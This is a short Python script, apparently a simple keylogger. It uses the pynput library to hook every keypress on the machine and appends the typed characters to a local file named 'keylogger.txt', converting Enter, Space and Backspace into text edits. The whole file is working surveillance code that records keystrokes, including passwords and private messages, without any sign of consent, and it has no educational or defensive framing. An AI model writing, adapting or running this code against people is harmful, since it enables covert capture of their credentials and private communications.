# -*- coding: utf-8 -*-
import datetime
from pynput.keyboard import Listener

#d= datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
#f=open('keylogger_{}.txt'.format(d),'w')
#f=open('keylogger.txt','w')

def key_recorder(key):    
    f=open('keylogger.txt','a')
    keyo=str(key)
    
    if keyo=="Key.enter":
        f.write('\n')
    elif keyo=="Key.space": 
        f.write(" ")
    elif keyo =="Key.backspace":       
        #f.write(keyo.replace(keyo,""))          
        size=f.tell()    # the size... 
        f.truncate(size-1)     
    elif keyo=="Key.alt_l" or keyo=="Key.tab":
        f.write('')  
    elif keyo=="Key.ctrl_l":
        f.write('')    
    elif keyo=="Key.alt_gr":
        f.write('')                                 
    else:
        print(keyo)
        f.write(keyo.replace("'",""))
           
                 
with Listener(on_press=key_recorder) as l :
    l.join()    
    
